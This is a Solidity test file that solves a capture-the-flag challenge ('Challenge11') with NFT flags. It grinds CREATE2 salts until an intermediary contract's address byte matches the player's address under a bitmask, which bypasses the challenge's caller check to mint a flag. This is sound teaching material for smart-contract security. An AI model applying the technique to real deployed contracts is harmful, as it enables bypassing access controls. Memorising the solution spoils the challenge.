// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/Test.sol";
import {BaseTest} from "../BaseTest.sol";
import {Challenge11} from "../../../src/season1/Challenge11.sol";
import {NFTFlags} from "../../../src/season1/NFTFlags.sol";

// Step 1: create an intermediary contract to call mintFlag
contract CallChallenge11 {
    function callChallenge11(Challenge11 challenge11) public {
        challenge11.mintFlag();
    }
}

contract Challenge11Test is BaseTest {
    Challenge11 challenge11;

    function setUp() public {
        setUpChallenges();

        vm.startPrank(ADMIN);

        challenge11 = new Challenge11(address(nftFlags));
        nftFlags.addAllowedMinter(address(challenge11));

        vm.stopPrank();
    }

    function test_challenge11() public {
        vm.startPrank(PLAYER, PLAYER);

        // Step 2: get the bytecode of CallChallenge11 and calculate its hash
        bytes memory callerBytecode = type(CallChallenge11).creationCode;
        bytes32 bytecodeHash = keccak256(callerBytecode);

        uint256 salt = 0;

        // Step 3: keep trying salts until the deployed address matches
        while (true) {
            bytes32 deployedAddressBytes = keccak256(abi.encodePacked(bytes1(0xff), PLAYER, salt, bytecodeHash));
            address deployedAddress = address(uint160(uint256(deployedAddressBytes)));

            uint8 senderLast = uint8(abi.encodePacked(deployedAddress)[19]);
            uint8 originLast = uint8(abi.encodePacked(PLAYER)[19]);

            if ((senderLast & 0x15) == (originLast & 0x15)) {
                // Step 4: deploy the contract with the correct salt
                address addr;
                assembly {
                    addr := create2(0, add(callerBytecode, 0x20), mload(callerBytecode), salt)
                }

                assert(address(addr) == deployedAddress);

                CallChallenge11 caller = CallChallenge11(addr);
                caller.callChallenge11(challenge11);
                break;
            }

            salt++;
        }

        // DONE: You should have obtained the flag for challenge #11
        assertTrue(nftFlags.hasMinted(PLAYER, 11));
    }
}
